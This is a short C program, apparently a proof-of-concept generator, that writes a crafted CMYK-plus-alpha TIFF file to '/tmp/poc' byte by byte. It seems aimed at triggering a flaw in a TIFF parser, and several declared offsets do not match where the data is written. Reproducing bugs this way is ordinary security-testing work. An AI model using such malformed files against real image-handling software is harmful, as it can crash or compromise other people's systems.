#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) return 1;

    /* TIFF header (little-endian) */
    fputc(0x49, f);
    fputc(0x49, f);
    fputc(0x2A, f);
    fputc(0x00, f);

    /* IFD offset: 8 */
    fputc(0x08, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);

    /* IFD: 11 entries */
    fputc(0x0B, f);
    fputc(0x00, f);

    /* Entry 1: ImageWidth (0x0100) SHORT count=1 value=64 */
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x03, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x40, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 2: ImageLength (0x0101) SHORT count=1 value=64 */
    fputc(0x01, f); fputc(0x01, f);
    fputc(0x03, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x40, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 3: BitsPerSample (0x0102) SHORT count=5, offset to array after IFD */
    fputc(0x02, f); fputc(0x01, f);
    fputc(0x03, f); fputc(0x00, f);
    fputc(0x05, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x96, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 4: Compression (0x0103) SHORT count=1 value=1 */
    fputc(0x03, f); fputc(0x01, f);
    fputc(0x03, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 5: PhotometricInterpretation (0x0106) SHORT count=1 value=5 (CMYK) */
    fputc(0x06, f); fputc(0x01, f);
    fputc(0x03, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x05, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 6: SamplesPerPixel (0x0115) SHORT count=1 value=5 */
    fputc(0x15, f); fputc(0x01, f);
    fputc(0x03, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x05, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 7: RowsPerStrip (0x0116) SHORT count=1 value=64 */
    fputc(0x16, f); fputc(0x01, f);
    fputc(0x03, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x40, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 8: StripOffsets (0x0111) LONG count=1, value = offset to pixel data */
    fputc(0x11, f); fputc(0x01, f);
    fputc(0x04, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0xA0, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 9: StripByteCounts (0x0117) LONG count=1 value=20480 */
    fputc(0x17, f); fputc(0x01, f);
    fputc(0x04, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x50, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 10: ExtraSamples (0x0152) SHORT count=1, value stored as array at offset */
    fputc(0x52, f); fputc(0x01, f);
    fputc(0x03, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    /* offset to ExtraSamples array = 0x9E */
    fputc(0x9E, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 11: PlanarConfiguration (0x011C) SHORT count=1 value=1 (chunky) */
    fputc(0x1C, f); fputc(0x01, f);
    fputc(0x03, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Next IFD offset: 0 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* BitsPerSample array: 8,8,8,8,8 (C,M,Y,K,A) */
    fputc(0x08, f); fputc(0x00, f);
    fputc(0x08, f); fputc(0x00, f);
    fputc(0x08, f); fputc(0x00, f);
    fputc(0x08, f); fputc(0x00, f);
    fputc(0x08, f); fputc(0x00, f);

    /* ExtraSamples array: 2 (ASSOCALPHA) */
    fputc(0x02, f); fputc(0x00, f);

    /* Pixel data: 64x64 CMYKA pixels (each pixel = 0x00,0x00,0x00,0x00,0x80) */
    {
        int i;
        for (i = 0; i < 4096; i++) {
            fputc(0x00, f);
            fputc(0x00, f);
            fputc(0x00, f);
            fputc(0x00, f);
            fputc(0x80, f);
        }
    }

    fclose(f);
    return 0;
}

